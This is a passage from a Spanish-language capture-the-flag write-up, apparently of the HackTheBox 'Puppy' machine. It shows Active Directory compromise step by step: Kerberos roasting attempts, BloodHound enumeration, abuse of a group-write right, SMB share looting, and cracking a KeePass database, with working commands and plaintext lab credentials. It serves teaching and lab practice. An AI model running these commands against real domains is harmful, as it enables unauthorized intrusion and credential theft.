<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="no">GetNPUsers</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pass</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="n">puppy</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="no">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="no">Copyright</span> <span class="no">Fortra</span><span class="p">,</span> <span class="no">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[-]</span> <span class="no">User</span> <span class="no">Administrator</span> <span class="n">doesn</span><span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User levi.james doesn&#39;</span><span class="n">t</span> <span class="n">have</span> <span class="no">UF_DONT_REQUIRE_PREAUTH</span> <span class="n">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[-]</span> <span class="no">User</span> <span class="n">ant</span><span class="o">.</span><span class="n">edwards</span> <span class="n">doesn</span><span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User jamie.williams doesn&#39;</span><span class="n">t</span> <span class="n">have</span> <span class="no">UF_DONT_REQUIRE_PREAUTH</span> <span class="n">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[-]</span> <span class="no">User</span> <span class="n">steph</span><span class="o">.</span><span class="n">cooper</span> <span class="n">doesn</span><span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User steph.cooper_adm doesn&#39;</span><span class="n">t</span> <span class="n">have</span> <span class="no">UF_DONT_REQUIRE_PREAUTH</span> <span class="n">set</span></span></span></code></pre></div>
<p>No se pudo. Probemos con el usuario levi.james para solicitar un TGS:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="no">GetUserSPNs</span> <span class="s1">&#39;puppy.htb/levi.james:KingofAkron2025!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="no">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="no">Copyright</span> <span class="no">Fortra</span><span class="p">,</span> <span class="no">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">No</span> <span class="n">entries</span> <span class="n">found!</span></span></span></code></pre></div>
<p>Procedemos a usar <strong>bloodhound-python</strong> para recolectar toda la informaci√≥n de la estructura del DC que pueda:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;levi.james&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;KingofAkron2025!&#39;</span> <span class="o">-</span><span class="n">ns</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">d</span> <span class="n">puppy</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">c</span> <span class="no">All</span> <span class="o">--</span><span class="n">zip</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">BloodHound</span><span class="o">.</span><span class="n">py</span> <span class="k">for</span> <span class="no">BloodHound</span> <span class="no">LEGACY</span> <span class="p">(</span><span class="no">BloodHound</span> <span class="mi">4</span><span class="o">.</span><span class="mi">2</span> <span class="ow">and</span> <span class="mi">4</span><span class="o">.</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="no">AD</span> <span class="ss">domain</span><span class="p">:</span> <span class="n">puppy</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Getting</span> <span class="no">TGT</span> <span class="k">for</span> <span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="ss">WARNING</span><span class="p">:</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="no">Kerberos</span> <span class="no">TGT</span><span class="o">.</span> <span class="no">Falling</span> <span class="n">back</span> <span class="n">to</span> <span class="no">NTLM</span> <span class="n">authentication</span><span class="o">.</span> <span class="ss">Error</span><span class="p">:</span> <span class="no">Kerberos</span> <span class="ss">SessionError</span><span class="p">:</span> <span class="no">KRB_AP_ERR_SKEW</span><span class="p">(</span><span class="no">Clock</span> <span class="n">skew</span> <span class="n">too</span> <span class="n">great</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Connecting</span> <span class="n">to</span> <span class="no">LDAP</span> <span class="ss">server</span><span class="p">:</span> <span class="n">dc</span><span class="o">.</span><span class="n">puppy</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">1</span> <span class="n">domains</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">1</span> <span class="n">domains</span> <span class="k">in</span> <span class="n">the</span> <span class="n">forest</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">1</span> <span class="n">computers</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Connecting</span> <span class="n">to</span> <span class="no">LDAP</span> <span class="ss">server</span><span class="p">:</span> <span class="n">dc</span><span class="o">.</span><span class="n">puppy</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">10</span> <span class="n">users</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">56</span> <span class="n">groups</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">3</span> <span class="n">gpos</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">3</span> <span class="n">ous</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">19</span> <span class="n">containers</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Found</span> <span class="mi">0</span> <span class="n">trusts</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">computer</span> <span class="n">enumeration</span> <span class="n">with</span> <span class="mi">10</span> <span class="n">workers</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Querying</span> <span class="ss">computer</span><span class="p">:</span> <span class="no">DC</span><span class="o">.</span><span class="n">PUPPY</span><span class="o">.</span><span class="n">HTB</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Done</span> <span class="k">in</span> <span class="mo">00</span><span class="n">M</span> <span class="mi">18</span><span class="n">S</span>
</span></span><span class="line"><span class="cl"><span class="ss">INFO</span><span class="p">:</span> <span class="no">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20251004191634</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span></span></span></code></pre></div>
<p>Procedemos a desplegar <a href="https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/"  class="external-link" target="_blank" rel="noopener"><strong>Bloodhound</strong></a> con <code>docker compose</code>. Accedemos a Bloodhound via web e importamos el .zip generado por <strong>bloodhound-python</strong>:</p>
<p><img src="/images/posts/puppy/levi.png" alt=""></p>
<p><img src="/images/posts/puppy/levi2.png" alt=""></p>
<p>Al ser miembro del grupo <a href="mailto:HR@puppy.htb" >HR@puppy.htb</a> tenemos el derecho <code>GenericWrite</code> en el grupo <a href="mailto:DEVELOPERS@puppy.htb" >DEVELOPERS@puppy.htb</a>. Clickeamos en ese derecho y luego mostramos <code>Linux Abuse</code>:</p>
<blockquote>
<p>&ldquo;La escritura gen√©rica en un grupo permite modificar directamente la pertenencia al grupo.&rdquo;</p></blockquote>
<p>B√°sicamente, con este derecho podemos agregarnos a ese grupo mismo aprovechandonos de ese derecho:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">addmem</span> <span class="s2">&#34;DEVELOPERS&#34;</span> <span class="s2">&#34;levi.james&#34;</span> <span class="o">-</span><span class="n">U</span> <span class="s2">&#34;puppy.htb&#34;</span><span class="o">/</span><span class="s2">&#34;levi.james&#34;</span><span class="s">%&#39;KingofAkron2025!&#39;</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&#34;10.10.11.70&#34;</span></span></span></code></pre></div>
<p>Verificamos si ya estamos en ese grupo:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">members</span> <span class="s2">&#34;DEVELOPERS&#34;</span> <span class="o">-</span><span class="n">U</span> <span class="s2">&#34;puppy.htb&#34;</span><span class="o">/</span><span class="s2">&#34;levi.james&#34;</span><span class="s">%&#39;KingofAkron2025!&#39;</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&#34;10.10.11.70&#34;</span>
</span></span><span class="line"><span class="cl"><span class="no">PUPPY</span><span class="p">\</span><span class="n">levi</span><span class="o">.</span><span class="n">james</span>
</span></span><span class="line"><span class="cl"><span class="no">PUPPY</span><span class="p">\</span><span class="n">ant</span><span class="o">.</span><span class="n">edwards</span>
</span></span><span class="line"><span class="cl"><span class="no">PUPPY</span><span class="p">\</span><span class="n">adam</span><span class="o">.</span><span class="n">silver</span>
</span></span><span class="line"><span class="cl"><span class="no">PUPPY</span><span class="p">\</span><span class="n">jamie</span><span class="o">.</span><span class="n">williams</span></span></span></code></pre></div>
<p>Funcion√≥, ahora como somos miembros de ese grupo, tratemos de ingresar en el directorio <strong>DEV</strong>, que vimos al principio cuando hicimos un mapeo de carpetas compartidas:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;levi.james&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;KingofAkron2025!&#39;</span> <span class="o">--</span><span class="n">shares</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[+]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">levi</span><span class="o">.</span><span class="n">james</span><span class="ss">:KingofAkron2025!</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Enumerated</span> <span class="n">shares</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="no">Share</span>           <span class="no">Permissions</span>     <span class="no">Remark</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="no">ADMIN</span><span class="err">$</span>                          <span class="no">Remote</span> <span class="no">Admin</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="n">C</span><span class="err">$</span>                              <span class="no">Default</span> <span class="n">share</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="no">DEV</span>             <span class="no">READ</span>            <span class="no">DEV</span><span class="o">-</span><span class="no">SHARE</span> <span class="k">for</span> <span class="no">PUPPY</span><span class="o">-</span><span class="no">DEVS</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="no">IPC</span><span class="err">$</span>            <span class="no">READ</span>            <span class="no">Remote</span> <span class="no">IPC</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="no">NETLOGON</span>        <span class="no">READ</span>            <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="no">SYSVOL</span>          <span class="no">READ</span>            <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span></span></span></code></pre></div>
<p>Enumeramos el recurso:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">smbclient</span> <span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span><span class="o">/</span><span class="no">DEV</span> <span class="o">-</span><span class="n">U</span> <span class="s1">&#39;levi.james%KingofAkron2025!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="no">Try</span> <span class="s2">&#34;help&#34;</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="ss">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">dir</span>
</span></span><span class="line"><span class="cl">  <span class="o">.</span>                                  <span class="no">DR</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Mar</span> <span class="mi">23</span> <span class="mo">03</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">57</span> <span class="mi">2025</span>
</span></span><span class="line"><span class="cl">  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">Mar</span>  <span class="mi">8</span> <span class="mi">11</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">57</span> <span class="mi">2025</span>
</span></span><span class="line"><span class="cl">  <span class="no">KeePassXC</span><span class="o">-</span><span class="mi">2</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">9</span><span class="o">-</span><span class="no">Win64</span><span class="o">.</span><span class="n">msi</span>           <span class="n">A</span> <span class="mi">34394112</span>  <span class="no">Sun</span> <span class="no">Mar</span> <span class="mi">23</span> <span class="mo">03</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">12</span> <span class="mi">2025</span>
</span></span><span class="line"><span class="cl">  <span class="no">Projects</span>                            <span class="n">D</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">Mar</span>  <span class="mi">8</span> <span class="mi">11</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">36</span> <span class="mi">2025</span>
</span></span><span class="line"><span class="cl">  <span class="n">recovery</span><span class="o">.</span><span class="n">kdbx</span>                       <span class="n">A</span>     <span class="mi">2677</span>  <span class="no">Tue</span> <span class="no">Mar</span> <span class="mi">11</span> <span class="mi">22</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">46</span> <span class="mi">2025</span></span></span></code></pre></div>
<p>Nos descargamos recovery.kdbx, e instalamos keepassxc para abrir ese tipo de formato.</p>
<p><img src="/images/posts/puppy/image.png" alt="alt text"></p>
<p>Nos pide clave, tratemos de romper el hash de ese binario con keepass2john:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">keepass2john</span> <span class="n">recovery</span><span class="o">.</span><span class="n">kdbx</span> 
</span></span><span class="line"><span class="cl"><span class="o">!</span> <span class="n">recovery</span><span class="o">.</span><span class="n">kdbx</span> <span class="p">:</span> <span class="no">File</span> <span class="n">version</span> <span class="s1">&#39;40000&#39;</span> <span class="n">is</span> <span class="n">currently</span> <span class="ow">not</span> <span class="n">supported!</span></span></span></code></pre></div>
<p>Investiguemos en busca de un script que pueda romper esa version 4+(<a href="https://github.com/r3nt0n/keepass4brute"  class="external-link" target="_blank" rel="noopener">keepass4brute</a>):</p>
<p><img src="/images/posts/puppy/image-1.png" alt="alt text"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">scripts</span><span class="o">/</span><span class="n">keepass4brute</span><span class="o">/</span><span class="n">keepass4brute</span><span class="o">.</span><span class="n">sh</span> <span class="n">recovery</span><span class="o">.</span><span class="n">kdbx</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> 
</span></span><span class="line"><span class="cl"><span class="n">keepass4brute</span> <span class="mi">1</span><span class="o">.</span><span class="mi">3</span> <span class="n">by</span> <span class="n">r3nt0n</span>
</span></span><span class="line"><span class="cl"><span class="ss">https</span><span class="p">:</span><span class="sr">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">r3nt0n</span><span class="o">/</span><span class="n">keepass4brute</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="no">Words</span> <span class="ss">tested</span><span class="p">:</span> <span class="mi">36</span><span class="o">/</span><span class="mi">14344392</span> <span class="o">-</span> <span class="no">Attempts</span> <span class="n">per</span> <span class="ss">minute</span><span class="p">:</span> <span class="mi">45</span> <span class="o">-</span> <span class="no">Estimated</span> <span class="n">time</span> <span class="ss">remaining</span><span class="p">:</span> <span class="mi">31</span> <span class="n">weeks</span><span class="p">,</span> <span class="mi">4</span> <span class="n">days</span>
</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="no">Current</span> <span class="ss">attempt</span><span class="p">:</span> <span class="n">liverpool</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Password</span> <span class="ss">found</span><span class="p">:</span> <span class="n">liverpool</span></span></span></code></pre></div>
<p>Abrimos la base de datos keepass:</p>
<p><img src="/images/posts/puppy/image-2.png" alt="alt text"></p>
<p>Copiemoslas y la guardamos en passwords.txt para probarla con mi lista de usuarios:</p>
<p><img src="/images/posts/puppy/image-3.png" alt="alt text"></p>
<h4 id="credentialstxt-1">
  credentials.txt
  <a class="heading-link" href="#credentialstxt-1">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">levi.james / KingofAkron2025
</span></span><span class="line"><span class="cl">ant.edwards / Antman2025!</span></span></code></pre></div>
<p>Enumeramos los recursos compartidos en el DC:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;ant.edwards&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;Antman2025!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">________</span>  <span class="n">___</span>      <span class="n">___</span>  <span class="n">_______</span>   <span class="n">___</span>      <span class="n">___</span>       <span class="n">__</span>         <span class="n">_______</span>
</span></span><span class="line"><span class="cl">   <span class="sr">/&#34;       )|&#34;  \    /</span><span class="s2">&#34;  ||   _  &#34;</span><span class="p">\</span> <span class="o">|</span><span class="s2">&#34;  \    /&#34;</span>  <span class="o">|</span>     <span class="sr">/&#34;&#34;\       |   __ &#34;\
</span></span></span><span class="line"><span class="cl"><span class="sr">  (:   \___/</span>  <span class="p">\</span>   <span class="p">\</span>  <span class="sr">//</span>   <span class="o">|</span><span class="p">(</span><span class="o">.</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span>  <span class="p">:)</span> <span class="p">\</span>   <span class="p">\</span>  <span class="sr">//</span>   <span class="o">|</span>    <span class="o">/</span>    <span class="p">\</span>      <span class="p">(</span><span class="o">.</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="p">:)</span>
</span></span><span class="line"><span class="cl">   <span class="p">\</span><span class="n">___</span>  <span class="p">\</span>    <span class="sr">/\  \/.    ||:     \/   /</span><span class="p">\</span>   <span class="p">\</span><span class="o">/.</span>    <span class="o">|</span>   <span class="sr">/&#39; /</span><span class="p">\</span>  <span class="p">\</span>     <span class="o">|</span><span class="p">:</span>  <span class="n">____</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">    <span class="n">__</span><span class="o">/</span>  <span class="p">\</span>   <span class="o">|</span><span class="p">:</span> <span class="p">\</span><span class="o">.</span>        <span class="o">|</span><span class="p">(</span><span class="o">|</span>  <span class="n">_</span>  <span class="p">\</span>  <span class="o">|</span><span class="p">:</span> <span class="p">\</span><span class="o">.</span>        <span class="o">|</span>  <span class="sr">//</span>  <span class="n">__</span><span class="err">&#39;</span>  <span class="p">\</span>    <span class="p">(</span><span class="o">|</span>  <span class="o">/</span>
</span></span><span class="line"><span class="cl">   <span class="sr">/&#34; \   :) |.  \    /</span><span class="p">:</span>  <span class="o">||</span><span class="p">:</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span>  <span class="p">:)</span><span class="o">|.</span>  <span class="p">\</span>    <span class="sr">/:  | /</span>   <span class="o">/</span>  <span class="p">\</span>   <span class="p">\</span>  <span class="sr">/|__/</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="n">_______</span><span class="o">/</span>  <span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="p">\</span><span class="n">__</span><span class="o">/|</span><span class="n">___</span><span class="o">|</span><span class="p">(</span><span class="n">_______</span><span class="o">/</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="p">\</span><span class="n">__</span><span class="o">/|</span><span class="n">___</span><span class="o">|</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>    <span class="p">\</span><span class="n">___</span><span class="p">)(</span><span class="n">_______</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="no">SMBMap</span> <span class="o">-</span> <span class="no">Samba</span> <span class="no">Share</span> <span class="no">Enumerator</span> <span class="n">v1</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">7</span> <span class="o">|</span> <span class="no">Shawn</span> <span class="no">Evans</span> <span class="o">-</span> <span class="no">ShawnDEvans</span><span class="vi">@gmail</span><span class="o">.</span><span class="n">com</span>
</span></span><span class="line"><span class="cl">                     <span class="ss">https</span><span class="p">:</span><span class="sr">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="no">ShawnDEvans</span><span class="o">/</span><span class="n">smbmap</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Detected</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="n">serving</span> <span class="no">SMB</span>                                                                                                  
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Established</span> <span class="mi">1</span> <span class="no">SMB</span> <span class="n">connections</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">authenticated</span> <span class="n">session</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>                                                          
</span></span><span class="line"><span class="cl">                                                                                                                             
</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="ss">IP</span><span class="p">:</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span><span class="p">:</span><span class="mi">445</span> <span class="ss">Name</span><span class="p">:</span> <span class="n">dc</span>                        <span class="ss">Status</span><span class="p">:</span> <span class="no">Authenticated</span>
</span></span><span class="line"><span class="cl">        <span class="no">Disk</span>                                                    <span class="no">Permissions</span>     <span class="no">Comment</span>
</span></span><span class="line"><span class="cl">        <span class="o">----</span>                                                    <span class="o">-----------</span>     <span class="o">-------</span>
</span></span><span class="line"><span class="cl">        <span class="no">ADMIN</span><span class="err">$</span>                                                  <span class="no">NO</span> <span class="no">ACCESS</span>       <span class="no">Remote</span> <span class="no">Admin</span>
</span></span><span class="line"><span class="cl">        <span class="n">C</span><span class="err">$</span>                                                      <span class="no">NO</span> <span class="no">ACCESS</span>       <span class="no">Default</span> <span class="n">share</span>
</span></span><span class="line"><span class="cl">        <span class="no">DEV</span>                                                     <span class="no">READ</span><span class="p">,</span> <span class="no">WRITE</span>     <span class="no">DEV</span><span class="o">-</span><span class="no">SHARE</span> <span class="k">for</span> <span class="no">PUPPY</span><span class="o">-</span><span class="no">DEVS</span></span></span></code></pre></div>
<p>Ahora podemos leer y escribir en ese recurso.</p>
<p>Nos vamos al <strong>Bloodhound</strong>, para visualizar si ant.edwards tiene alg√∫n derecho para seguir pivoteando en el DC:</p>
<p><img src="/images/posts/puppy/image-4.png" alt="alt text"></p>
<p>Nos dice que ant.ewards est√° en el grupo de SENIOR_DEV, y SENIOR_DEV tiene un derecho <code>GenericAll</code> hac√≠a adam.silver:</p>
<blockquote>
<p>&ldquo;El control total de un usuario le permite modificar las propiedades del usuario para realizar un ataque kerberoast dirigido y tambi√©n otorga la capacidad de restablecer la contrase√±a del usuario sin conocer su contrase√±a actual.&rdquo;</p></blockquote>
